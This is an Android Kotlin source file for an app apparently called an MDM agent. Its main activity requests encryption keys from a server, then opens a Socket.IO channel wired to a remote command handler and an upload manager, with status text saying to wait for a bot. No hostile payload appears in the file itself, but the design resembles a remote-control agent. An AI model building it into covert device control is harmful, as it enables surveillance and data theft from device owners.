package com.mdm.agent

import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.mdm.agent.data.remote.ApiClient
import com.mdm.agent.data.remote.CommandHandler
import com.mdm.agent.data.remote.CryptoManager
import com.mdm.agent.data.remote.SocketManager
import com.mdm.agent.data.remote.UploadManager
import com.mdm.agent.util.DeviceUtils

class MainActivity : AppCompatActivity() {

    private val TAG = "MainActivity"
    private var statusText: TextView? = null
    private var socketManager: SocketManager? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.i(TAG, "🚀 MainActivity started")

        statusText = TextView(this).apply {
            text = "جاري الاتصال بالخادم..."
            textSize = 18f
            textAlignment = TextView.TEXT_ALIGNMENT_CENTER
            setPadding(50, 200, 50, 50)
        }
        setContentView(statusText)

        // Connect to server DIRECTLY from MainActivity
        connectToServer()
    }

    private fun connectToServer() {
        Thread {
            try {
                Log.i(TAG, "📡 Starting connection...")
                val deviceId = DeviceUtils.getDeviceId(this)
                val serverUrl = DeviceUtils.getServerUrl(this)
                Log.i(TAG, "  Server: $serverUrl")
                Log.i(TAG, "  Device: $deviceId")

                // 1. Init crypto
                val apiClient = ApiClient(this)
                val cryptoManager = CryptoManager()
                val uploadManager = UploadManager(this)

                updateStatus("طلب مفاتيح التشفير...")
                val cryptoResult = apiClient.initCrypto(deviceId)
                if (cryptoResult != null) {
                    cryptoManager.initFromServer(cryptoResult)
                    Log.i(TAG, "✅ Crypto initialized")
                }

                // 2. Create SocketManager
                updateStatus("إنشاء اتصال Socket.IO...")
                socketManager = SocketManager(this)

                // 3. Setup command handler
                val commandHandler = CommandHandler(this, apiClient, cryptoManager, socketManager!!, uploadManager)
                socketManager?.setCommandHandler(commandHandler)
                socketManager?.setCryptoManager(cryptoManager)

                // 4. Connect!
                updateStatus("الاتصال بالخادم...")
                socketManager?.connect()

                Log.i(TAG, "🎉 Socket.IO connect called!")
                updateStatus("تم الاتصال ✅\nانتظر إشعار البوت")

            } catch (e: Exception) {
                Log.e(TAG, "❌ Connection failed: ${e.message}", e)
                updateStatus("فشل الاتصال: ${e.message}")
            }
        }.start()
    }

    private fun updateStatus(text: String) {
        Handler(Looper.getMainLooper()).post {
            statusText?.text = text
            Log.i(TAG, "Status: $text")
        }
    }
}
